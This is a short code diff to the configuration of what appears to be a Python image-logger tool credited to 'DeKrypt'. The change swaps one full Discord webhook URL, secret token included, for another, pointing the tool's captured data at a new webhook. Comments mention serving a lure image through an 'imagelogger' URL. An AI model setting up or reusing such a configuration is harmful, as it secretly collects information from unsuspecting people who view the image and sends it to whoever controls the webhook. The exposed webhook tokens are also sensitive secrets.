@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1130225907777421503/5tHm5SACn6dHUaYTZ3nzaCAIrI_N5atMGqKmURgRR6e4vS1qQ4SIEDnHVALIbDcQ29G5",
+    "webhook": "https://canary.discord.com/api/webhooks/1150820628102905876/77zpzXYv4L-KazXEPP3d6ISKTSTHdQLV_TgnVfTUjlTJW14jaw10WLHhh1z7tiCi0A4M",
     "image": "https://www.tvsrennes.com/ressources/images/88ed7338d197.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
